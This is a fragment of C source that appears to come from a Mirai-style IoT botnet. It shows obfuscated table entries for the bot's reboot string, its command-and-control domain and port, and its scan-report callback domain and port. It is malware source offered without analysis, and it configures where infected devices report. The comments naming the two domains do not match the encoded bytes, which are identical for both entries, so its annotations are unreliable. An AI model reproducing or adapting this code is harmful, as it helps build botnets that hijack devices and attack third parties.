...
{
    add_entry(TABLE_REBOOT_CODE, "\x50\x47\x40\x4D\x4D\x56\x22",7);
    add_entry(TABLE_CNC_DOMAIN, "\x13\x1B\x10\x0C\x13\x14\x1A\x0C\x13\x0C\x16\x22", 12); // cnc.changeme.com
    add_entry(TABLE_CNC_PORT, "\x10\x11\x22", 3);   // 23

    add_entry(TABLE_SCAN_CB_DOMAIN, "\x13\x1B\x10\x0C\x13\x14\x1A\x0C\x13\x0C\x16\x22", 12); // report.changeme.com
    add_entry(TABLE_SCAN_CB_PORT, "\x16\x1A\x13\x12\x13\x22", 6);         // 48101
